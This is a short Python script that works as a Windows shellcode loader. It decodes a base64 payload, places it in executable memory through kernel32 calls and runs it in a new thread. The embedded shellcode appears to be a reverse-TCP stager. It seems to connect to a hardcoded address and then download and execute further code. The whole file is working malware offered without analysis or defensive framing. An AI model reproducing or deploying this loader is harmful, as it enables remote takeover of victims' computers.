
import ctypes
import base64

encode_shellcode = b'/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYUUiLUiBWTTHJSItyUEgPt0pKSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBQi0gYSQHQ41ZNMclI/8lBizSISAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCAF9RwKhPiUFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V'

shellcode = base64.b64decode(encode_shellcode)
writable_shellcode = bytearray(shellcode)
ctypes.windll.kernel32.VirtualAlloc.restype=ctypes.c_uint64

ptr = ctypes.windll.kernel32.VirtualAlloc(
    ctypes.c_void_p(0),  # lpAddress
    ctypes.c_size_t(len(shellcode)),  # dwSize
    ctypes.c_uint(0x3000),  # flAllocationType (MEM_COMMIT | MEM_RESERVE)
    ctypes.c_uint(0x40)  # flProtect (PAGE_EXECUTE_READWRITE)
)


if not ptr:
    raise Exception("VirtualAlloc failed, error code: %d" % ctypes.get_last_error())

buf = (ctypes.c_char * len(writable_shellcode)).from_buffer(writable_shellcode)

if not ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    ctypes.create_string_buffer(shellcode),
    len(shellcode)
):
    raise Exception("RtlMoveMemory failed, error code: %d" % ctypes.get_last_error())

ht = ctypes.windll.kernel32.CreateThread(
    ctypes.c_void_p(0),  # lpThreadAttributes
    ctypes.c_size_t(0),  # dwStackSize
    ctypes.c_void_p(ptr),  # lpStartAddress
    ctypes.c_void_p(0),  # lpParameter
    ctypes.c_uint(0),  # dwCreationFlags
    ctypes.byref(ctypes.c_ulong(0))  # lpThreadId
)

if not ht:
    raise Exception("CreateThread failed, error code: %d" % ctypes.get_last_error())


if ctypes.windll.kernel32.WaitForSingleObject(
    ctypes.c_void_p(ht),
    ctypes.c_int(-1)
) == 0xFFFFFFFF:
    raise Exception("WaitForSingleObject failed, error code: %d" % ctypes.get_last_error())